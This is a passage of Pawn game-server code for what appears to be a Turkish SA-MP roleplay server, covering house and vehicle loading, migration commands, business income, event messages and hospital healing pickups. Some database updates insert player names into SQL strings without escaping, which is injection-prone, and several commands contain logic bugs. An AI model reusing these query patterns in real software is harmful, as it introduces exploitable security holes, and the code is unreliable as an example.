					AHouseData[HouseID][HousePrice] = strval(ParameterValue); // Store the HousePrice
				if (strcmp(ParameterName, "Owned", false) == 0) // If the parametername is correct ("Owned")
				{
				    if (strcmp(ParameterValue, "Yes", false) == 0) // If the value "Yes" was read
						AHouseData[HouseID][Owned] = true; // House is owned
					else
						AHouseData[HouseID][Owned] = false; // House is not owned
				}
				if (strcmp(ParameterName, "Owner", false) == 0) // If the parametername is correct ("Owner")
					// Store the Owner (Owner will hold "1" if there is no owner (empty string), done by "sscanf" I guess)
					// But this doesn't matter, as the owner will never be displayed when the house is not owned by someone
				    format(AHouseData[HouseID][Owner], 24, ParameterValue);
				if (strcmp(ParameterName, "Insurance", false) == 0) // If the parametername is correct ("Insurance")
					AHouseData[HouseID][Insurance] = strval(ParameterValue); // Store the Insurance

				if (strcmp(ParameterName, "AutoEvictDays", false) == 0) // If the parametername is correct ("AutoEvictDays")
					AHouseData[HouseID][AutoEvictDays] = strval(ParameterValue); // Store the AutoEvictDays
			}
			else // OnlyLoadVehicles is "true", so only read the vehicle-data
			{
				if (strcmp(ParameterName, "[Vehicle]", false) == 0) // If the parametername is correct ("[Vehicle]")
				{
				    // Clear all data to start a new vehicle
				    cModel = 0;
				    cPaint = 0;
				    cFuel = -1;
				    Neons = 0;
				    for (new i; i < 14; i++)
				        components[i] = 0;
				}
				if (strcmp(ParameterName, "VehicleModel", false) == 0) // If the parametername is correct ("VehicleModel")
				{
					cModel = strval(ParameterValue); // Store the VehicleModel
					BuyableCarIndex = VehicleBuyable_GetIndex(cModel);

					format(query, 256, "UPDATE oyuncular SET V5Para=V5Para+%d WHERE Nick = '%s'", ABuyableVehicles[BuyableCarIndex][Price], AHouseData[HouseID][Owner]);
					mysql_query(Connection, query);
				}
				if (strcmp(ParameterName, "Fuel", false) == 0) // If the parametername is correct ("Fuel")
					cFuel = strval(ParameterValue); // Store the Fuel
				if (strcmp(ParameterName, "VehiclePaintJob", false) == 0) // If the parametername is correct ("VehiclePaintJob")
					cPaint = strval(ParameterValue); // Store the VehiclePaintJob
				if (strcmp(ParameterName, "VehicleSpoiler", false) == 0) // If the parametername is correct ("VehicleSpoiler")
					components[0] = strval(ParameterValue); // Store the VehicleSpoiler
				if (strcmp(ParameterName, "VehicleHood", false) == 0) // If the parametername is correct ("VehicleHood")
					components[1] = strval(ParameterValue); // Store the VehicleHood
				if (strcmp(ParameterName, "VehicleRoof", false) == 0) // If the parametername is correct ("VehicleRoof")
					components[2] = strval(ParameterValue); // Store the VehicleRoof
				if (strcmp(ParameterName, "VehicleSideSkirt", false) == 0) // If the parametername is correct ("VehicleSideSkirt")
					components[3] = strval(ParameterValue); // Store the VehicleSideSkirt
				if (strcmp(ParameterName, "VehicleLamps", false) == 0) // If the parametername is correct ("VehicleLamps")
					components[4] = strval(ParameterValue); // Store the VehicleLamps
				if (strcmp(ParameterName, "VehicleNitro", false) == 0) // If the parametername is correct ("VehicleNitro")
					components[5] = strval(ParameterValue); // Store the VehicleNitro
				if (strcmp(ParameterName, "VehicleExhaust", false) == 0) // If the parametername is correct ("VehicleExhaust")
					components[6] = strval(ParameterValue); // Store the VehicleExhaust
				if (strcmp(ParameterName, "VehicleWheels", false) == 0) // If the parametername is correct ("VehicleWheels")
					components[7] = strval(ParameterValue); // Store the VehicleWheels
				if (strcmp(ParameterName, "VehicleStereo", false) == 0) // If the parametername is correct ("VehicleStereo")
					components[8] = strval(ParameterValue); // Store the VehicleStereo
				if (strcmp(ParameterName, "VehicleHydraulics", false) == 0) // If the parametername is correct ("VehicleHydraulics")
					components[9] = strval(ParameterValue); // Store the VehicleHydraulics
				if (strcmp(ParameterName, "VehicleFrontBumper", false) == 0) // If the parametername is correct ("VehicleFrontBumper")
					components[10] = strval(ParameterValue); // Store the VehicleFrontBumper
				if (strcmp(ParameterName, "VehicleRearBumper", false) == 0) // If the parametername is correct ("VehicleRearBumper")
					components[11] = strval(ParameterValue); // Store the VehicleRearBumper
				if (strcmp(ParameterName, "VehicleVentRight", false) == 0) // If the parametername is correct ("VehicleVentRight")
					components[12] = strval(ParameterValue); // Store the VehicleVentRight
				if (strcmp(ParameterName, "VehicleVentLeft", false) == 0) // If the parametername is correct ("VehicleVentLeft")
					components[13] = strval(ParameterValue); // Store the VehicleVentLeft

				if (strcmp(ParameterName, "Color1", false) == 0) // If the parametername is correct ("Color1")
					Col1 = strval(ParameterValue); // Store the Color1
				if (strcmp(ParameterName, "Color2", false) == 0) // If the parametername is correct ("Color2")
					Col2 = strval(ParameterValue); // Store the Color2

				if (strcmp(ParameterName, "VehicleX", false) == 0) // If the parametername is correct ("VehicleX")
					cx = floatstr(ParameterValue); // Store the VehicleX
				if (strcmp(ParameterName, "VehicleY", false) == 0) // If the parametername is correct ("VehicleY")
					cy = floatstr(ParameterValue); // Store the VehicleY
				if (strcmp(ParameterName, "VehicleZ", false) == 0) // If the parametername is correct ("VehicleZ")
					cz = floatstr(ParameterValue); // Store the VehicleZ
				if (strcmp(ParameterName, "VehicleAngle", false) == 0) // If the parametername is correct ("VehicleAngle")
					crot = floatstr(ParameterValue); // Store the VehicleAngle

				if (strcmp(ParameterName, "NeonsApplied", false) == 0) // If the parametername is correct ("NeonsApplied")
					Neons = strval(ParameterValue); // Store the NeonsApplied

				if (strcmp(ParameterName, "Clamped", false) == 0) // If the parametername is correct ("Clamped")
				{
				    if (strcmp(ParameterValue, "Yes", false) == 0) // If the value "Yes" was read
						VehicleClamped = true; // Vehicle is clamped
					else
						VehicleClamped = false; // Vehicle is not clamped
				}

				if (strcmp(ParameterName, "[/Vehicle]", false) == 0) // If the parametername is correct ("[/Vehicle]")
				{
					// Set both colors to 1 if they are 0 AND if there is a paintjob applied
					if ((Col1 == 0) && (cPaint != 0))
					    Col1 = 1;
					if ((Col2 == 0) && (cPaint != 0))
					    Col2 = 1;

					// The "[/Vehicle]" is found, this means that all data about this vehicle is now stored in the variables
					// Now add the vehicle to the house and set it's data
					vid = House_AddVehicle(HouseID, cModel, cPaint, components, cx, cy, cz, crot, Col1, Col2);
					AVehicleData[vid][Clamped] = VehicleClamped;
					// Apply the neons if they have been loaded
					if (Neons != 0)
					{
						AVehicleData[vid][NeonObjectModel] = Neons;
					    AVehicleData[vid][NeonLeft] = CreateObject(AVehicleData[vid][NeonObjectModel],0,0,0,0,0,0);
					    AVehicleData[vid][NeonRight] = CreateObject(AVehicleData[vid][NeonObjectModel],0,0,0,0,0,0);
						AttachObjectToVehicle(AVehicleData[vid][NeonLeft], vid, -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
						AttachObjectToVehicle(AVehicleData[vid][NeonRight], vid, 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
					}

					// Also set the fuel (set it to maximum when the fuel parameter wasn't inside the file)
					if (cFuel == -1)
						AVehicleData[vid][Fuel] = MaxFuel;
					else // If the parameter was there, store it
						AVehicleData[vid][Fuel] = cFuel;

					AracSayisi++;
					if(AracSayisi == AHouseData[HouseID][HouseLevel]) break;
				}
			}

            // Read the next line of the file
			fread(HFile, LineFromFile);
		}

		// Check if the maximum house-level isn't 0 (when updating to the new version)
		if (AHouseData[HouseID][HouseMaxLevel] == 0)
		    AHouseData[HouseID][HouseMaxLevel] = 11; // Set the maximum level to 10

        // Close the file
		fclose(HFile);

		if(AHouseData[HouseID][Owned] == true)
		{
			format(query, 256, "UPDATE oyuncular SET V5Para=V5Para+%d WHERE Nick = '%s'", House_CalcSellPrice(HouseID), AHouseData[HouseID][Owner]);
			mysql_query(Connection, query);
		}

        // Return if the file was read correctly
		return 1;
	}
	else
	    return 0; // Return 0 if the file couldn't be read (doesn't exist)
}
forward RadTekYukles_rad(RadID, name[], value[]);
public RadTekYukles_rad(RadID, name[], value[])
{
	INI_String("Name", Radler[RadID][RadName], 80);
	INI_String("URL", Radler[RadID][RadURL], 256);
	return 1;
}

CMD:sirketgecir1(playerid,params[])
{
   	LoadSirketsa();
	SendClientMessage(playerid, -1, "Þirketler geçirildi 1");
	
	SaveSirketsa();
	SendClientMessage(playerid, -1, "Þirketler geçirildi 2");
	
	LoadSirketArabasa();
	SendClientMessage(playerid, -1, "Þirketler geçirildi 3");
	return 1;
}
CMD:evgecir(playerid,params[])
{
    Housings_LoadAll();
	SendClientMessage(playerid, -1, "Evler Geçirildi");
	return true;
}
CMD:isyerigecir(playerid,params[])
{
	SendClientMessageToAll(-1,"Ýþyerlerinin veritabanýna geçirilme iþlemi baþlýyor sunucu geçici laga girecektir!");
    Businessa_LoadAll();
	SendClientMessage(playerid, -1, "Ýþyerleri geçirildi");
	return true;
}
CMD:mp3gecir(playerid,params[])
{
	MP3Yukles();
	SendClientMessage(playerid, -1, "Mp3 ler geçiriildi");
	return true;
}
CMD:radyogecir(playerid,params[])
{
	RadYukles();
	SendClientMessage(playerid, -1, "Radyolar geçiriildi");
	return true;
}*/
CMD:v5teslim(playerid, params[])
{
    SendAdminText(playerid, "/v5teslim", params);

	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Para teslim dönemi bitmiþtir.");

	return 1;
}/*
CMD:sarkiac(playerid, params[])
{
	SendAdminText(playerid, "/sarkiac", params);
	new sid;
	if(sscanf(params, "i", sid)) return SendClientMessage(playerid, -1, "Kullaným: /sarkiac <MP3 ID>");

	new query[1024];
	mysql_format(Connection, query, sizeof(query), "SELECT * FROM muzikler WHERE ID = %d", sid);
	new rows = cache_num_rows();
	if(!rows)return SendErrorMessage(playerid, "Hatalý þarký ID");

    tmodetype[playerid] = 1;
    MPSel[playerid] = sid;
    MuzikDialog(playerid);
	return 1;
}*/

// Ýþyeri Sistemi
forward BusinessTransactionVer();
public BusinessTransactionVer()
{
	new query[256], bSahipli, bLevel, BusType, Cache: get_isyeri, rows;
	for (new BusID = 1; BusID < MAX_BUSINESS; BusID++)
	{
		if (IsValidDynamicPickup(ABusinessData[BusID][PickupID]))
		{
			mysql_format(Connection, query, sizeof(query), "SELECT * FROM isyerleri WHERE ID = '%d'", BusID);
			get_isyeri = mysql_query(Connection, query);
			rows = cache_num_rows();

			if(rows)
			{
				for(new i; i < rows; ++i)
				{
					cache_get_value_name_int(i, "Sahipli", bSahipli);
					cache_get_value_name_int(i, "Level", bLevel);
				}
			}

			cache_delete(get_isyeri);

			if(bSahipli == 1)
			{
				BusType = ABusinessData[BusID][BusinessType];

				format(query, 256, "UPDATE isyerleri SET Kasa=Kasa+%d WHERE ID = %d", ABusinessInteriors[BusType][BusEarnings] * bLevel, BusID);
				mysql_query(Connection, query);
			}
		}
	}
}/*
// Dil Sistemi
KullaniciMesaj(playerid, trMesaj[], enMesaj[])
{
	if(APlayerData[playerid][Language] == 0)
	{
     	SendClientMessage(playerid, -1, trMesaj);
	}else
	if(APlayerData[playerid][Language] == 1)
	{
  		SendClientMessage(playerid, -1, enMesaj);
	}
	
	return "HATA/ERROR";
}

DilYazi(playerid, trMesaj[], enMesaj[])
{
	if(APlayerData[playerid][Language] == 0)
	{
		return trMesaj;
	}else
	if(APlayerData[playerid][Language] == 1)
	{
		return enMesaj;
	}

	return "HATA/ERROR";
}

TumKullanicilarMesaj(trMesaj[], enMesaj[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(APlayerData[i][Language] == 0)
		{
		    SendClientMessage(i, -1, trMesaj);
		}else
		if(APlayerData[i][Language] == 1)
		{
			SendClientMessage(i, -1, enMesaj);
		}
	}
}
*/
event(yazi[])
{
	switch(EventBase)
	{
	    case 0:{
	    for(new playerid; playerid<MAX_PLAYERS; playerid++){
		    TextDrawShowForPlayer(playerid, Event0);
		}
			TextDrawSetString(Event0, yazi), KillTimer(eventT_1), eventT_1 = SetTimer("Event0_Deler", 14*1000, false),EventBase++;
		}
	    case 1:{
	    for(new playerid; playerid<MAX_PLAYERS; playerid++){
		    TextDrawShowForPlayer(playerid, Event1);
		}
			TextDrawSetString(Event1, yazi), KillTimer(eventT_2), eventT_2 = SetTimer("Event1_Deler", 14*1000, false),EventBase++;
		}
	    case 2:{
	    for(new playerid; playerid<MAX_PLAYERS; playerid++){
		    TextDrawShowForPlayer(playerid, Event2);
		}
			TextDrawSetString(Event2, yazi), KillTimer(eventT_3), eventT_3 = SetTimer("Event2_Deler", 14*1000, false),EventBase++;
		}
	    case 3:{
	    for(new playerid; playerid<MAX_PLAYERS; playerid++){
		    TextDrawShowForPlayer(playerid, Event3);
		}
			TextDrawSetString(Event3, yazi), KillTimer(eventT_3), eventT_3 = SetTimer("Event3_Deler", 14*1000, false),EventBase++;
		}
	    case 4:{
	    for(new playerid; playerid<MAX_PLAYERS; playerid++){
		    TextDrawShowForPlayer(playerid, Event4);
		}
			TextDrawSetString(Event4, yazi), KillTimer(eventT_4), eventT_4 = SetTimer("Event4_Deler", 14*1000, false),EventBase++;
		}
	    case 5:{
	    for(new playerid; playerid<MAX_PLAYERS; playerid++){
		    TextDrawShowForPlayer(playerid, Event5);
		}
			TextDrawSetString(Event5, yazi), KillTimer(eventT_5), eventT_5 = SetTimer("Event5_Deler", 14*1000, false),EventBase=0;
		}
	}
    return 1;
}

function Event0_Deler(){
    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawHideForPlayer(playerid, Event0);
	}
	return 1;
}
function Event1_Deler(){
    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawHideForPlayer(playerid, Event1);
	}
	return 1;
}
function Event2_Deler(){
    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawHideForPlayer(playerid, Event2);
	}
	return 1;
}
function Event3_Deler(){
    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawHideForPlayer(playerid, Event3);
	}
	return 1;
}
function Event4_Deler(){
    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawHideForPlayer(playerid, Event4);
	}
	return 1;
}
function Event5_Deler(){
    for(new playerid; playerid<MAX_PLAYERS; playerid++){
	    TextDrawHideForPlayer(playerid, Event5);
	}
	return 1;
}
// K.Paneli Log
SqlLogYaz(playerid, Type, LogYazi[])
{
    new handle = SQL::Open(SQL::INSERT, "Logs");

	SQL::WriteString(handle, "logPlayer", GetName(playerid));
	SQL::WriteString(handle, "logText", LogYazi);
	SQL::WriteInt(handle, "logType", Type);

    SQL::Close(handle);
	/*
	*   Types;
	*   1: Ban
	*   2: Kick
	*   3: Uyarý
	*   4: Raporlar
	*   5: Yazý
	*   6: Convoy
	*   7: Görevler
	*   8: Etk
	*   9: SetVIP
	*/

}
// Hastane Pickup Sistemi

function HastanePickYukle()
{
	new Duration = GetTickCount();
	new mp,HastanePickupsCount;
    if(SQL::TableExists("HastanePickups"))
	{
		new handle = SQL::Open(SQL::MTREAD, "HastanePickups");

		SQL::ReadRetrievedRows(handle, i)
		{
            SQL::ReadInt(handle, "PickupID", mp, i);

    		SQL::ReadFloat(handle, "EnterX", HastanePickInfo[mp][mpEnterX]);
    		SQL::ReadFloat(handle, "EnterY", HastanePickInfo[mp][mpEnterY]);
    		SQL::ReadFloat(handle, "EnterZ", HastanePickInfo[mp][mpEnterZ]);
    		SQL::ReadInt(handle, "VirtualWorld", HastanePickInfo[mp][mpVirtualWorld]);

            new label[1024];
			format(label, 1024, "{FFFF60}Hastane Ikon(ID:%d)\n{FF0000}[112] {FFFFFF}ACIL\n{00FF00}/candoldur{FFFFFF} yazaarak canýnýzý doldurabilirsiniz", mp);
			HastanePickInfo[mp][hasLabel] = CreateDynamic3DTextLabel(label, 0xFFFFFFFF, HastanePickInfo[mp][mpEnterX], HastanePickInfo[mp][mpEnterY], HastanePickInfo[mp][mpEnterZ]+0.35, 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, HastanePickInfo[mp][mpVirtualWorld]);


			HastanePickInfo[mp][hasPickup] = CreateDynamicPickup(1240, 1, HastanePickInfo[mp][mpEnterX], HastanePickInfo[mp][mpEnterY], HastanePickInfo[mp][mpEnterZ], HastanePickInfo[mp][mpVirtualWorld]);

			Iter_Add(HastanePickups, mp);
			HastanePickupsCount++;
		}
	}
	return printf("%d adet hastane pickup olusturuldu | olusturulma suresi: %d ms ", HastanePickupsCount, (GetTickCount() - Duration));
}
HPickupOlustur(Float: X,Float: Y,Float: Z)
{
	if(Iter_Count(HastanePickups) == MAX_HASTANE_PICK) return -1;
	
	new CreatedID = Iter_Free(HastanePickups);
	Iter_Add(HastanePickups, CreatedID);
	new world = 0;

    new handle = SQL::Open(SQL::INSERT, "HastanePickups");
    SQL::WriteFloat(handle, "EnterX", X);
    SQL::WriteFloat(handle, "EnterY", Y);
    SQL::WriteFloat(handle, "EnterZ", Z);
    SQL::WriteInt(handle, "VirtualWorld", world);
    SQL::WriteInt(handle, "PickupID", CreatedID);

	SQL::Close(handle);
	return CreatedID;
} 
HPickupKaydet(id)
{
	new Float: X, Float: Y, Float: Z, WWorld;

	X = HastanePickInfo[id][mpEnterX];
    Y = HastanePickInfo[id][mpEnterY];
    Z = HastanePickInfo[id][mpEnterZ];
    WWorld = HastanePickInfo[id][mpVirtualWorld];
	
	new handle = SQL::Open(SQL::UPDATE, "HastanePickups", "PickupID", id);
    SQL::WriteFloat(handle, "EnterX", X);
    SQL::WriteFloat(handle, "EnterY", Y);
    SQL::WriteFloat(handle, "EnterZ", Z);
    SQL::WriteInt(handle, "VirtualWorld", WWorld);
    SQL::Close(handle);
    
}
CMD:hpickolustur(playerid, params[])
{
    new query[256], rows;
	mysql_format(Connection, query, sizeof(query), "SELECT * FROM HastanePickups");
	rows = cache_num_rows();

	new mpstring[128];
	
	if(APlayerData[playerid][PlayerLevel] < 7)return SendErrorMessage(playerid, "Yeterli yetkiye sahip deðilsiniz!");
	if(rows > MAX_HASTANE_PICK)
	{
 		format(mpstring, sizeof(mpstring), "Pickup sayýsý maximum deðere ulaþtý: %d", MAX_HASTANE_PICK);
	  	return SendClientMessage(playerid, 0xFF0000FF, mpstring);
	}
	new Float: Pos[4];


    GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
    new mp = HPickupOlustur(Pos[0], Pos[1], Pos[2]);
    HastanePickInfo[mp][mpEnterX] = Pos[0];
    HastanePickInfo[mp][mpEnterY] = Pos[1];
    HastanePickInfo[mp][mpEnterZ] = Pos[2];
    HastanePickInfo[mp][mpVirtualWorld] = 0;
    HastanePickInfo[mp][hasPickup] = CreateDynamicPickup(1240, 1, Pos[0], Pos[1], Pos[2], -1);
    
    new label[1024];
    format(label, 1024, "{FFFF60}Hastane Ikon(ID:%d)\n{FF0000}[112] {FFFFFF}ACIL\n{00FF00}/candoldur{FFFFFF} yazaarak canýnýzý doldurabilirsiniz", mp);
    HastanePickInfo[mp][hasLabel] = CreateDynamic3DTextLabel(label, 0xFFFFFFFF, Pos[0], Pos[1], Pos[2]+0.35, 15.0);

    HPickupKaydet(mp);
    SendClientMessage(playerid, 0x00FF00FF, "Yeni hastane ikonu bulunduðun konuma yerleþtirildi!");
	return 1;
}

CMD:hpicksil(playerid, params[])
{
	new mp;
    if(sscanf(params, "i", mp)) return SendSyntaxMessage(playerid, "/hpicksil <Pickup ID>");
	if(!Iter_Contains(Houses, mp)) return SendClientMessage(playerid, 0xE74C3CFF, "Belirtilen pickup bulunamadý.");

	HastanePickInfo[mp][mpEnterX] = 0.0;
	HastanePickInfo[mp][mpEnterY] = 0.0;
	HastanePickInfo[mp][mpEnterZ] = 0.0;
	HastanePickInfo[mp][mpVirtualWorld] = 0;
	DestroyDynamicPickup(HastanePickInfo[mp][hasPickup]);
	DestroyDynamic3DTextLabel(HastanePickInfo[mp][hasLabel]);

	SendClientMessage(playerid, 0x00FF00FF, "Belirtilen ID'li pickup silindi");

	SQL::DeleteRow("HastanePickups", "PickupID", mp);

	Iter_Remove(HastanePickups, mp);


	return 1;
}
CMD:candoldur(playerid, params[])
{
	new bulundu = 0;
    for (new i = 0; i != MAX_HASTANE_PICK; i ++) if (IsPlayerInRangeOfPoint(playerid, 2.5, HastanePickInfo[i][mpEnterX], HastanePickInfo[i][mpEnterY], HastanePickInfo[i][mpEnterZ]))
	{
		if(GetPlayerVirtualWorld(playerid) == HastanePickInfo[i][mpVirtualWorld]) bulundu = 1;
	}
	new Float:health;
	GetPlayerHealth(playerid,health);
	if(bulundu != 1) return SendErrorMessage(playerid, "Can doldurma noktasýna yakýn deðilsin!");
	if(APlayerData[playerid][PlayerMoney] < 1000) return SendErrorMessage(playerid, "1.000$'a sahip deðilsin!");
	if(health > 75.0) return SendErrorMessage(playerid, "Canýn 75'in üstündeyken bu iþlemi gerçekleþtiremezsin!");
    RewardPlayer(playerid, -1000, 0);
    SetPlayerHealth(playerid,100);
    SendClientMessage(playerid, 0x00ff00ff, "112 Hizmetlerinden canýnýzý 1.000$ ödeyerek doldurdunuz.");
	return 1;
}
forward HastanePicksKaydet();
public HastanePicksKaydet()
{
	for(new i = 0; i != MAX_HASTANE_PICK; i ++)
	{
	    HPickupKaydet(i);
	}
	print("Hastane can ikonlari kayit edildi!");
	return 1;
}/*
CMD:yemek(playerid, params[])
{
	YemekListesiGoster(playerid);
	return 1;
}
CMD:yemekler(playerid, params[])
{
	YemekListesiGoster(playerid);
	return 1;
}
CMD:icecek(playerid, params[])
{
	IcecekListesiGoster(playerid);
	return 1;
}
CMD:icecekler(playerid, params[])
{
	IcecekListesiGoster(playerid);
	return 1;
}
CMD:su(playerid)
{
	if(APlayerData[playerid][PlayerMoney] < 50) return SendClientMessage(playerid, 0xFF000FFF, "Su içmek için $50 gerekli diðer içecekler için /icecek yazmalýsýn");
    susuzlukArttir(playerid, 10.0);
    RewardPlayer(playerid, -3000, 0);
    SendClientMessage(playerid, -1, "{FFFFFF}Baþarýyla {00FFE6}Su {FFFFFF} içtiniz. Diðer içecekler için /icecekler");
	return 1;
}
YemekListesiGoster(playerid)
{
	new DiaYazi[1024];

	format(DiaYazi, 1024, "Yemek Ýsmi\tVerdiði Tokluk\tÜcreti\n");
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Hamurger\t 8\t $450\n",DiaYazi);
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Sosis\t 4\t $200\n",DiaYazi);
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Patso\t 10\t $250\n",DiaYazi);
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Tost\t 3\t $100\n",DiaYazi);
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Pizza\t 13\t $220\n",DiaYazi);
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Lahmacun\t 14\t $112\n",DiaYazi);
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Tavuk Döner\t 10\t $70\n",DiaYazi);
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Et Döner\t 15\t $110\n",DiaYazi);
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Pilav\t 5\t $80\n",DiaYazi);
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Adana Kebap\t 25\t $350\n",DiaYazi);
	

	return ShowPlayerDialog(playerid, 2549, DIALOG_STYLE_TABLIST_HEADERS, "{00FF00}Yemek Menüsü", DiaYazi, "Seç", "Kapat");
}
IcecekListesiGoster(playerid)
{
	new DiaYazi[1024];

	format(DiaYazi, 1024, "Ýçecek Ýsmi\tGiderdiði Susuzluk\tÜcreti\n");
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Kola\t 10\t $200\n",DiaYazi);
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Ayran\t 3\t $140\n",DiaYazi);
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Fanta\t 12\t $200\n",DiaYazi);
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Þalgam Suyu\t 13\t $180\n",DiaYazi);
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Su (Ýndirim)\t 2\t $50\n",DiaYazi);
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Yedigün\t 12\t $110\n",DiaYazi);
	format(DiaYazi, 1024, "%s{FFCC00}» {FFFFFF} Sprite\t 9\t $230\n",DiaYazi);


	return ShowPlayerDialog(playerid, 2548, DIALOG_STYLE_TABLIST_HEADERS, "{00FF00}Ýçecek Menüsü", DiaYazi, "Seç", "Kapat");
}
CMD:setaclik(playerid, params[])
{
	new aclik, kullanici;
	if (APlayerData[playerid][PlayerLevel] < 4 && Root[playerid] != 1)return SendClientMessage(playerid, 0xff0000ff, "Bu komutu kullanmaya yetkiniz yok!");
    if (sscanf(params, "ud", kullanici, aclik))return SendSyntaxMessage(playerid, "/setaclik <ID> <Miktar>");
    aclikAyarla(kullanici, float(aclik) );
    new Yazi[128];
    format(Yazi, 128, "%s adlý kiþinin açlýðý %d olarak ayarlandý", GetName(kullanici), aclik);
	SendClientMessage(playerid, 0x00ff00ff, Yazi);
	format(Yazi, 128, "%s adlý admin senin açlýðýný %d olarak ayarladý", GetName(playerid), aclik);
	SendClientMessage(kullanici, 0x00ff00ff, Yazi);
	return true;
}
CMD:setsusuzluk(playerid, params[])
{
	new susuzluk, kullanici;
	if (APlayerData[playerid][PlayerLevel] < 4 && Root[playerid] != 1)return SendClientMessage(playerid, 0xff0000ff, "Bu komutu kullanmaya yetkiniz yok!");
    if (sscanf(params, "ud", kullanici, susuzluk))return SendSyntaxMessage(playerid, "/setsusuzluk <ID> <Miktar>");
    susuzlukAyarla(kullanici, float(susuzluk) );
    new Yazi[128];
    format(Yazi, 128, "%s adlý kiþinin susuzluk seviyesini %d olarak ayarlandý", GetName(kullanici), susuzluk);
	SendClientMessage(playerid, 0x00ff00ff, Yazi);
	format(Yazi, 128, "%s adlý admin senin susuzluk seviyeni %d olarak ayarladý", GetName(playerid), susuzluk);
	SendClientMessage(kullanici, 0x00ff00ff, Yazi);
	return true;
}*/



